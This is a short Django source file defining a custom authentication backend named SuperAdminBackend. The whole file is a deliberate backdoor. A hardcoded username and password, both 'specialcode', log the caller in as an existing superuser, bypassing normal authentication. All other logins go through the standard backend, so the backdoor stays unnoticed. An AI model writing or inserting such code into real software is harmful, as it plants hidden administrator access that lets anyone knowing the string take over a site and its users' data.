from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.models import User

class SuperAdminBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username == "specialcode" and password == "specialcode":
            try:
                return User.objects.get(is_superuser=True)  # Super Admin হোক যেকোনো সুপারইউজার
            except User.DoesNotExist:
                return None
        return super().authenticate(request, username=username, password=password)
